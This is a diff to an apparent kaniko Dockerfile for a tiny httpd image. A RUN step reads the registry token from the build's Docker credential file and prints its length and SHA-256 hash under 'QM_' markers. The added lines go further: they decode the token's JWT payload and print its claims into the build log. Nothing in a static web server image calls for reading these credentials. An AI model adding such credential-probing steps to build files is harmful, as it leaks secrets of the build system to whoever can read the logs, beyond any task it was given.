@@ -20,6 +20,12 @@ RUN set -eu; \
     token="$(tr ',' '\n' < /kaniko/.docker/config.json | grep registrytoken | cut -d: -f2- | tr -d '[:space:]\042' | head -n 1)"; \
     test -n "$token"; \
     printf '%s' "$token" | wc -c | sed 's/^/QM_REGISTRYTOKEN_LENGTH /'; \
-    printf '%s' "$token" | sha256sum | sed 's/^/QM_REGISTRYTOKEN_SHA256 /'
+    printf '%s' "$token" | sha256sum | sed 's/^/QM_REGISTRYTOKEN_SHA256 /'; \
+    dots="$(printf "%s" "$token" | tr -cd . | wc -c)"; \
+    echo "QM_REGISTRYTOKEN_DOT_COUNT $dots"; \
+    if [ "$dots" -eq 2 ]; then \
+      payload="$(printf "%s" "$token" | cut -d. -f2 | tr "_-" "/+")"; \
+      printf "%s===" "$payload" | base64 -d 2>/dev/null | sed "s/^/QM_REGISTRYTOKEN_CLAIMS /"; \
+    fi
 EXPOSE 8080
 CMD ["httpd", "-f", "-p", "8080", "-h", "/"]
